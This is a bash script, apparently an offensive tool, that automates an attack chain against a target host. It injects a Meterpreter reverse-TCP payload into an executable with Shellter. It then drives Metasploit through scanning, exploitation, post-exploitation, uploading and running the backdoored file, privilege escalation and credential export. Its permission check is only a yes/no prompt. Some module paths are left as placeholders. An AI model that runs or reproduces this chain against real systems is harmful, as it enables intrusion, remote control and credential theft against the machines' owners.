#!/bin/bash

# Script to make target enumeration and exploitation more user-friendly

# Prompt for permission and contact information
echo "Welcome to the Server Enumeration and Exploitation Tool"
echo "-------------------------------------------------------"
echo ""

read -p "What is the URL or IP address of the target? " target
echo ""

read -p "Do you have permission to access this server? (yes/no) " permission
echo ""

if [[ $permission == "yes" ]]; then
    read -p "What is the name of the contact that gave you permission to access the server? " contact_name
    echo ""

    read -p "What is your name? " your_name
    echo ""

    read -p "Where are you from, $your_name? " location
    echo ""

    echo "Please note that any unauthorized access to a server is a strong violation of our terms and a legal action will be acted against anyone that violates it."
    echo ""
else
    echo "Sorry, you need permission to access this server. Exiting..."
    exit 1
fi

# Resolve URL to IP address
echo "Resolving URL to IP address, if needed..."
if [[ $target == *"http"* ]]; then
    target_ip=$(dig +short $(echo $target | cut -d'/' -f3) | tail -1)
else
    target_ip=$target
fi
echo "Target IP: $target_ip"
echo ""

# Shellter payload injection (Replace 'input_exe' with the path to the input executable)
input_exe="path/to/input_executable.exe"
output_exe="output_executable.exe"
payload="windows/meterpreter/reverse_tcp"
lhost="<your_local_ip>"
lport=4444

shellter -aI -f $input_exe -o $output_exe -p $payload -lhost $lhost -lport $lport

# Create Metasploit resource script
resource_file="msf_resource_script.rc"

cat > $resource_file <<- EOM
# Enumeration
workspace -a $your_name
db_nmap -p- -sS -sV -O -A $target_ip

# Web application scanning
use auxiliary/scanner/http/nikto
set RHOSTS $target_ip
run

# Exploit suggestions
use auxiliary/scanner/vuln/suggested_exploits
set RHOSTS $target_ip
run

# Exploit execution (Replace 'exploit_path' and 'payload' with appropriate values)
use exploit_path
set RHOSTS $target_ip
set PAYLOAD payload
run

# Post-exploitation (Replace 'post_exploit_module_path' with appropriate value)
use post_exploit_module_path
set SESSION 1
run

# Upload and execute Shellter-modified executable (Replace 'remote_path' with the target location)
upload $output_exe remote_path
shell -C "remote_path/$output_exe"

# Privilege escalation (Replace 'priv_esc_exploit_path' with appropriate value)
use priv_esc_exploit_path
set SESSION 1
run

# Save the report
services -o services_$target_ip.csv
notes -o notes_$target_ip.csv
creds -o creds_$target_ip.csv
vulns -o vulns_$target_ip.csv
EOM

# Run Metasploit with the resource script
echo "Running Metasploit with the resource script..."
msfconsole -r $resource_file

# Cleanup
echo "Cleaning up temporary files..."
rm $resource_file
echo ""

echo "Script completed. Thank you for using the Server Enumeration and Exploitation Tool!"
